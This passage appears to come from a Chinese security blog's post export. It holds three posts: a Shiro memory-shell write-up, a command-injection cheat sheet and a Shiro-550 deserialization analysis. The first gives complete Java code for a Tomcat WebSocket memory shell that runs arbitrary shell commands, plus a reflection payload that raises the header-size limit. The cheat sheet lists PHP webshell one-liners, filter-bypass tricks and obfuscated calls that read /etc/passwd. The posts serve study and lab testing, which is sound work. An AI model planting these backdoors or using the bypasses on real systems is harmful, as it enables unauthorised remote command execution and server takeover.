e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;  catch (InstantiationException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload.java</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class=\"line\">import org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class=\"line\">import javax.websocket.DeploymentException;</span><br><span class=\"line\">import javax.websocket.Endpoint;</span><br><span class=\"line\">import javax.websocket.EndpointConfig;</span><br><span class=\"line\">import javax.websocket.Session;</span><br><span class=\"line\">import javax.websocket.server.ServerContainer;</span><br><span class=\"line\">import javax.websocket.server.ServerEndpointConfig;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">public class payload extends Endpoint &#123;</span><br><span class=\"line\">    static&#123;</span><br><span class=\"line\">        WebappClassLoaderBase webappClassLoaderBase &#x3D; (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        StandardContext standardContext &#x3D; (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class=\"line\">        ServerEndpointConfig build &#x3D; ServerEndpointConfig.Builder.create(payload.class, &quot;&#x2F;login.jsp&quot;).build();</span><br><span class=\"line\">        WsServerContainer attribute &#x3D; (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            attribute.addEndpoint(build);</span><br><span class=\"line\">        &#125; catch (DeploymentException e) &#123;</span><br><span class=\"line\">            throw new RuntimeException(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Session session;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void onOpen(Session session, EndpointConfig config) &#123;</span><br><span class=\"line\">        this.session &#x3D; session;</span><br><span class=\"line\">        this.session.addMessageHandler(new MessageHandler());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    private class MessageHandler implements javax.websocket.MessageHandler.Whole&lt;String&gt; &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onMessage(String message) &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                boolean iswin &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;);</span><br><span class=\"line\">                Process exec;</span><br><span class=\"line\">                if (iswin) &#123;</span><br><span class=\"line\">                    exec &#x3D; Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, message&#125;);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    exec &#x3D; Runtime.getRuntime().exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, message&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                InputStream ips &#x3D; exec.getInputStream();</span><br><span class=\"line\">                StringBuilder sb &#x3D; new StringBuilder();</span><br><span class=\"line\">                int i;</span><br><span class=\"line\">                while((i &#x3D; ips.read()) !&#x3D; -1) &#123;</span><br><span class=\"line\">                    sb.append((char)i);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                ips.close();</span><br><span class=\"line\">                exec.waitFor();</span><br><span class=\"line\">                session.getBasicRemote().sendText(sb.toString());</span><br><span class=\"line\">            &#125; catch (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在测试的过程中又出现新的问题，HTTP头部长度太大，这牵扯到一个新问题  <code>maxHeadersize绕过</code>，解决方案如下</p>\n<blockquote>\n<p>通过反射修改 <code>org.apache.coyote.http11.AbstractHttp11Protocol</code> 的maxHeaderSize的大小（默认长度8192），这个值会影响新的Request的inputBuffer时的对于header的限制。但由于request的inputbuffer会复用，所以在修改完maxHeaderSize之后，需要多个连接同时访问（burp开多线程跑），让tomcat新建request的inputbuffer，这时候的buffer的大小就会使用修改后的值。</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207014100147.png\" alt=\"image-20221207014100147\"></p>\n<p>修改maxHeadersize</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class maxlen extends AbstractTranslet &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            java.lang.reflect.Field contextField &#x3D; org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">            java.lang.reflect.Field serviceField &#x3D; org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">            java.lang.reflect.Field requestField &#x3D; org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br><span class=\"line\">            java.lang.reflect.Field headerSizeField &#x3D; org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(&quot;headerBufferSize&quot;);</span><br><span class=\"line\">            java.lang.reflect.Method getHandlerMethod &#x3D; org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;,null);</span><br><span class=\"line\">            contextField.setAccessible(true);</span><br><span class=\"line\">            headerSizeField.setAccessible(true);</span><br><span class=\"line\">            serviceField.setAccessible(true);</span><br><span class=\"line\">            requestField.setAccessible(true);</span><br><span class=\"line\">            getHandlerMethod.setAccessible(true);</span><br><span class=\"line\">            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase &#x3D;</span><br><span class=\"line\">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">            org.apache.catalina.core.ApplicationContext applicationContext &#x3D; (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());</span><br><span class=\"line\">            org.apache.catalina.core.StandardService standardService &#x3D; (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class=\"line\">            org.apache.catalina.connector.Connector[] connectors &#x3D; standardService.findConnectors();</span><br><span class=\"line\">            for (int i &#x3D; 0; i &lt; connectors.length; i++) &#123;</span><br><span class=\"line\">                if (4 &#x3D;&#x3D; connectors[i].getScheme().length()) &#123;</span><br><span class=\"line\">                    org.apache.coyote.ProtocolHandler protocolHandler &#x3D; connectors[i].getProtocolHandler();</span><br><span class=\"line\">                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class=\"line\">                        Class[] classes &#x3D; org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class=\"line\">                        for (int j &#x3D; 0; j &lt; classes.length; j++) &#123;</span><br><span class=\"line\">                            &#x2F;&#x2F; org.apache.coyote.AbstractProtocol$ConnectionHandler</span><br><span class=\"line\">                            if (52 &#x3D;&#x3D; (classes[j].getName().length()) || 60 &#x3D;&#x3D; (classes[j].getName().length())) &#123;</span><br><span class=\"line\">                                java.lang.reflect.Field globalField &#x3D; classes[j].getDeclaredField(&quot;global&quot;);</span><br><span class=\"line\">                                java.lang.reflect.Field processorsField &#x3D; org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;);</span><br><span class=\"line\">                                globalField.setAccessible(true);</span><br><span class=\"line\">                                processorsField.setAccessible(true);</span><br><span class=\"line\">                                org.apache.coyote.RequestGroupInfo requestGroupInfo &#x3D; (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));</span><br><span class=\"line\">                                java.util.List list &#x3D; (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class=\"line\">                                for (int k &#x3D; 0; k &lt; list.size(); k++) &#123;</span><br><span class=\"line\">                                    org.apache.coyote.Request tempRequest &#x3D; (org.apache.coyote.Request) requestField.get(list.get(k));</span><br><span class=\"line\">                                    &#x2F;&#x2F; 10000 为修改后的 headersize</span><br><span class=\"line\">                                    headerSizeField.set(tempRequest.getInputBuffer(),10000);</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        &#x2F;&#x2F; 10000 为修改后的 headersize</span><br><span class=\"line\">                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改完headersize后，传参数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207022359990.png\" alt=\"image-20221207022359990\"></p>\n<p>这回的websocket连接状态已经改变，但是连接出现问题。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207022501554.png\" alt=\"image-20221207022501554\"></p>\n<p>日志</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207022711498.png\" alt=\"image-20221207022711498\"></p>\n<p>看来是payload种的MessageHandler中出现问题，重写一下payload.java</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class=\"line\">import org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.websocket.DeploymentException;</span><br><span class=\"line\">import javax.websocket.Endpoint;</span><br><span class=\"line\">import javax.websocket.EndpointConfig;</span><br><span class=\"line\">import javax.websocket.Session;</span><br><span class=\"line\">import javax.websocket.server.ServerContainer;</span><br><span class=\"line\">import javax.websocket.server.ServerEndpointConfig;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">public class payload extends Endpoint implements javax.websocket.MessageHandler.Whole&lt;String&gt;&#123;</span><br><span class=\"line\">    static&#123;</span><br><span class=\"line\">        WebappClassLoaderBase webappClassLoaderBase &#x3D; (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        StandardContext standardContext &#x3D; (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class=\"line\">        ServerEndpointConfig build &#x3D; ServerEndpointConfig.Builder.create(payload.class, &quot;&#x2F;login.jsp&quot;).build();</span><br><span class=\"line\">        WsServerContainer attribute &#x3D; (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            attribute.addEndpoint(build);</span><br><span class=\"line\">        &#125; catch (DeploymentException e) &#123;</span><br><span class=\"line\">            throw new RuntimeException(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Session session;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void onMessage(String s) &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Process process;</span><br><span class=\"line\">            boolean bool &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;);</span><br><span class=\"line\">            if (bool) &#123;</span><br><span class=\"line\">                process &#x3D; Runtime.getRuntime().exec(new String[] &#123; &quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, s &#125;);</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                process &#x3D; Runtime.getRuntime().exec(new String[] &#123; &quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, s &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            InputStream inputStream &#x3D; process.getInputStream();</span><br><span class=\"line\">            StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class=\"line\">            int i;</span><br><span class=\"line\">            while ((i &#x3D; inputStream.read()) !&#x3D; -1)</span><br><span class=\"line\">                stringBuilder.append((char)i);</span><br><span class=\"line\">            inputStream.close();</span><br><span class=\"line\">            process.waitFor();</span><br><span class=\"line\">            session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class=\"line\">        &#125; catch (Exception exception) &#123;</span><br><span class=\"line\">            exception.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void onOpen(final Session session, EndpointConfig config) &#123;</span><br><span class=\"line\">        this.session &#x3D; session;</span><br><span class=\"line\">        session.addMessageHandler(this);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207125849398.png\" alt=\"image-20221207125849398\"></p>\n","categories":["JavaSec"]},{"title":"命令执行","url":"/2023/12/25/rce/","content":"<p>命令执行</p>\n<a id=\"more\"></a>\n\n<h1 id=\"写文件\"><a href=\"#写文件\" class=\"headerlink\" title=\"写文件\"></a>写文件</h1><p>windows下</p>\n<p>对于&lt; , &amp; 等特殊字符使用 ^ 进行转义</p>\n<blockquote>\n<p>echo ^&lt;?php eval($_POST[a]); ?^&gt; &gt; shell.php</p>\n</blockquote>\n<p>Linux下</p>\n<blockquote>\n<p>echo ‘&lt;?php eval($_POST[a]); ?&gt;’ &gt; shell.php</p>\n</blockquote>\n<h1 id=\"管道符\"><a href=\"#管道符\" class=\"headerlink\" title=\"管道符\"></a>管道符</h1><p>windows 下</p>\n<blockquote>\n<p>| 直接执行后面的语句</p>\n</blockquote>\n<blockquote>\n<p>|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>\n</blockquote>\n<blockquote>\n<p>&amp; 前面和后面命令都要执行，无论前面真假</p>\n</blockquote>\n<blockquote>\n<p>&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>\n</blockquote>\n<p>linux下</p>\n<blockquote>\n<p>; 前面和后面命令都要执行，无论前面真假</p>\n</blockquote>\n<blockquote>\n<p>| 直接执行后面的语句</p>\n</blockquote>\n<blockquote>\n<p>|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>\n</blockquote>\n<blockquote>\n<p>&amp; 前面和后面命令都要执行，无论前面真假</p>\n</blockquote>\n<blockquote>\n<p>&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>\n</blockquote>\n<h1 id=\"空格绕过\"><a href=\"#空格绕过\" class=\"headerlink\" title=\"空格绕过\"></a>空格绕过</h1><blockquote>\n<p>$IFS</p>\n<p>$IFS$1</p>\n<p>${IFS}</p>\n<p>&lt;</p>\n<p>&lt;&gt;</p>\n<p>{cat,flag.php}</p>\n<p>X=$’A\\x20B’&amp;&amp;$X    A为命令，B为参数，用\\x20代替空格。</p>\n<p>%20 %09   php环境</p>\n</blockquote>\n<h1 id=\"关键字绕过\"><a href=\"#关键字绕过\" class=\"headerlink\" title=\"关键字绕过\"></a>关键字绕过</h1><p>反引号</p>\n<blockquote>\n<p>`id`</p>\n</blockquote>\n<p>$()</p>\n<blockquote>\n<p>ls $(id) 或者 $(id)</p>\n</blockquote>\n<p>内联执行</p>\n<blockquote>\n<p>a=who;b=ami;$a$b</p>\n<p>a=she;b=ll;cat $a$b.php</p>\n</blockquote>\n<p>反斜线</p>\n<blockquote>\n<p>ls;wh\\oa\\mi</p>\n</blockquote>\n<p>单双引号</p>\n<blockquote>\n<p>who’a’mi</p>\n</blockquote>\n<p>base64</p>\n<blockquote>\n<p>echo d2hvYW1p|base64 -d|sh<br>echo d2hvYW1p|base64 -d|bash</p>\n</blockquote>\n<p>hex</p>\n<blockquote>\n<p>echo 77686F616D69|xxd -r -p|bash</p>\n</blockquote>\n<p>代表为空的特殊字符</p>\n<blockquote>\n<p> $*   ls;who$*ami</p>\n<p>$@   ls;who$@ami</p>\n<p>$x  x为1-9</p>\n<p>${x}  x为任意正整数</p>\n</blockquote>\n<p>进阶</p>\n<blockquote>\n<p>wh`asd`oa`rfv`mi</p>\n</blockquote>\n<p>截取环境执行命令</p>\n<blockquote>\n<p>${PATH:5:1}${PATH:2:1}  </p>\n</blockquote>\n<p>Windows</p>\n<blockquote>\n<p>“w”h”o”a”m”i”</p>\n<p>wh^oa^mi</p>\n<p>(((w””h^o^a”m”i)))</p>\n<p>set a=who set b=ami %a%%b%</p>\n<p>set a=abc  who^%a:~0,1%mi</p>\n</blockquote>\n<h1 id=\"匹配符\"><a href=\"#匹配符\" class=\"headerlink\" title=\"匹配符\"></a>匹配符</h1><p>任意一个字符</p>\n<blockquote>\n<p>cat  sh[efg]ll.php   匹配[efg]中任意一个字符</p>\n<p>cat sh[a-z]ll.php   匹配[a-z]中任意一个字符</p>\n</blockquote>\n<p>任意字符</p>\n<blockquote>\n<p>cat she*</p>\n</blockquote>\n<p>正则</p>\n<blockquote>\n<p>cat ?????.???</p>\n</blockquote>\n<h1 id=\"函数名绕过\"><a href=\"#函数名绕过\" class=\"headerlink\" title=\"函数名绕过\"></a>函数名绕过</h1><p>php7</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 以system()为例:system(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class=\"line\">&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class=\"line\">(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class=\"line\">&quot;system&#x2F;*fgnb*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);&quot;</span><br><span class=\"line\">&quot;system&#x2F;*fgnb*&#x2F;(wh.&#x2F;*fgnb*&#x2F;(oa)&#x2F;*fgnb*&#x2F;.mi);&quot;</span><br><span class=\"line\">&quot;(sy.&#x2F;*fgnb*&#x2F;(st)&#x2F;*fgnb*&#x2F;.em)&#x2F;*fgnb*&#x2F;(wh.&#x2F;*fgnb*&#x2F;(oa)&#x2F;*fgnb*&#x2F;.mi);&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["速查"]},{"title":"shiro-550 反序列化","url":"/2023/12/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>学习shiro反序列化</p>\n<h1 id=\"是什么\"><a href=\"#是什么\" class=\"headerlink\" title=\"是什么\"></a>是什么</h1><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。</p>\n<p>Shiro提供了应用程序安全性API来执行以下方面：</p>\n<ul>\n<li><p>身份验证：证明用户身份，通常称为用户登录</p>\n</li>\n<li><p>授权：访问控制</p>\n</li>\n<li><p>密码术：保护或隐藏数据以防窥视；</p>\n</li>\n<li><p>会话管理：每个用户的时间敏感状态。</p>\n</li>\n</ul>\n<p>Shiro还支持一些辅助功能，例如Web应用程序安全性，单元测试和多线程支持，它们的存在也是为了加强上述四个方面。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>当 shiro 版本 <strong>&lt;1.2.5</strong>时，主要是由shiro 的 <strong>rememberMe</strong> 内容 <strong>反序列化</strong> 导致的命令执行漏洞，造成的原因是 <strong>AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</strong></p>\n<p>在我们勾选rememberme登陆后，刷新，抓包，将其 <strong>JSESSIONID 删除</strong>，使 shiro 验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p>\n<h1 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h1><p><a href=\"https://github.com/phith0n/JavaThings/tree/master/shirodemo\">JavaThings/shirodemo at master · phith0n/JavaThings (github.com)</a>，p神的shiro的demo 然后导入idea</p>\n<p>添加tomcat</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/48402bba71731b7a55a0c9bb2dd26168.png\" alt=\"image-20220225153128673\"></p>\n<p>部署war包</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/ec0211df706ace32bc4ee145c0d3a242.png\" alt=\"image-20220225153150758\"></p>\n<p>这样就行了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/35b2b65f586d4a843569e1258f5e1b64.png\" alt=\"image-20220225153302200\"></p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>admin ：secret 选择remember me登录，当访问其他资源时cookie中会携带rememberme，shiro会进行反序列化导致漏洞发生</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/294ee01c8c3bd6a9c6b100d564ede342.png\" alt=\"image-20220225154200301\"></p>\n<p>利用工具，爆破内置密钥</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/7b47279fbf85cc5a5a7eb8faf3cf33b1.png\" alt=\"image-20220225153415417\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><h2 id=\"加密过程\"><a href=\"#加密过程\" class=\"headerlink\" title=\"加密过程\"></a>加密过程</h2><p>账号密码登录，选择 remerberMe，入口是在 AbstractRememberMeManager.java 中的 onSuccessfulLogin 方法中，判断token是否为true，然后调用 <strong>rememberIdentity</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/1e1e2c9e08afc94621f695c57980b368.png\" alt=\"image-20220228192058505\"></p>\n<p><strong>getIdentityToRemember</strong> 作用是获取 用户名 赋值给 principals，然后再次调用<strong>重构的 rememberIdentity</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/60ffa04b9f2d2b957bc8f7c6e21d9c73.png\" alt=\"image-20220228192813101\"></p>\n<p>发现调用了 <strong>convertPrincipalsToBytes</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/8b50a41c3e1de8085aabeb72c26212c6.png\" alt=\"image-20220228193027909\"></p>\n<p>先是将用户名序列化处理 然后如果存在 <strong>getCipherService</strong> 看名字应该是获取某种加密方式 ，就进行加密操作 encrypt</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/b2912ce7de7ff68544d0de03d4750c71.png\" alt=\"image-20220228193222032\"></p>\n<p>看一下 getCipherService 确实是返回了一种aes的加密方式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/a6ccf19c0353db0026d4d4a43cb5a91f.png\" alt=\"image-20220228193509942\"></p>\n<p>看一下 encrypt ，看注释就知道，通过用设置好的加密方式，对传进来的已经序列化过的byte数组进行加密，然后返回加密的value</p>\n<p>这里这个地方 <strong>getEncryptionCipherKey()</strong> </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/d16239754af20536a418a54d9ac9d737.png\" alt=\"image-20220228193736549\"></p>\n<p>看到getEncryptionCipherKey() 直接返回一个常量，向上看看 encryptionCipherKey产生的过程</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/9689f4ed2bbbb5b072ee4facbd2f5672.png\" alt=\"image-20220228203944931\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AbstractRememberMeManager()</span><br><span class=\"line\">setCipherKey()</span><br><span class=\"line\">setEncryptionCipherKey()</span><br><span class=\"line\">encryptionCipherKey</span><br></pre></td></tr></table></figure>\n\n<p>看到最后 用到了 <strong>DEFAULT_CIPHER_KEY_BYTES</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/28bb17f0ca5be8907fa5d9ad636a3e50.png\" alt=\"image-20220228204320106\"></p>\n<p>而 <strong>DEFAULT_CIPHER_KEY_BYTES</strong> 是一个特定的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/31cb422a7d10184504006c407080a638.png\" alt=\"image-20220228204400367\"></p>\n<p>接下来就进入到了 cipherService.encrypt()，最后的encrypt就是具体的加密过程</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/6a65f3f4f5036d1957b9eb3013b229ec.png\" alt=\"image-20220228204618717\"></p>\n<p>一路向上返回到重构的 rememberIdentity 方法，然后进入到 <strong>rememberSerializedIdentity</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/355b4a7243d844a2ddbaa811b77b1111.png\" alt=\"image-20220228204826221\"></p>\n<p>在 CookieRememberMeManager.java 中 有一个 CookieRememberMeManager 类，看一下里面的方法，把刚才加密的byte进行base64加密，然后放到cookie中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/eceead19cc9bedc366664a80fdcbc3a9.png\" alt=\"image-20220225162643258\"></p>\n<p>此时，经过server返回登录响应，就可以看到rememberMe的值了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/7f48163000c280ab1a5a77a8458a6940.png\" alt=\"image-20220228205603747\"></p>\n<h2 id=\"解密过程\"><a href=\"#解密过程\" class=\"headerlink\" title=\"解密过程\"></a>解密过程</h2><p>了解了加密过程，如果使用了特定的key进行加密，如果在解密过程中有危险的点，就可以伪造cookie进行触发危险方法</p>\n<p>getRememberedPrincipals 下断点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/3614f0d0c40f3a26e38050a3d56c3298.png\" alt=\"image-20220228210252805\"></p>\n<p><strong>getRememberedSerializedIdentity</strong> 方法从名称来看是获取remember中的序列化的值，往下看看还有什么其他的操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/9035c6c8c55ea8ad4b3895a04e4f9dd9.png\" alt=\"image-20220225162737876\"></p>\n<p>通过getCookie读取cookie的值，判断符不符合base64格式，最后解码后返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/1104e03ff0796cfce5080c9c51b7d1fd.png\" alt=\"image-20220225163217983\"></p>\n<p>返回到 getRememberedPrincipals 中 调用 convertBytesToPrincipals</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/5b33127bfd9cd24486b42080cfbab076.png\" alt=\"image-20220228210659776\"></p>\n<p>可以看到就进行了两个操作 <strong>decrypt</strong> 和 <strong>deserialize</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/20f2721824ba1798fb2727f7d1ef7e2f.png\" alt=\"image-20220228210805161\"></p>\n<p>decrypt 就不跟进了，就是获取key解密，重点看一下反序列化的操作</p>\n<p><img 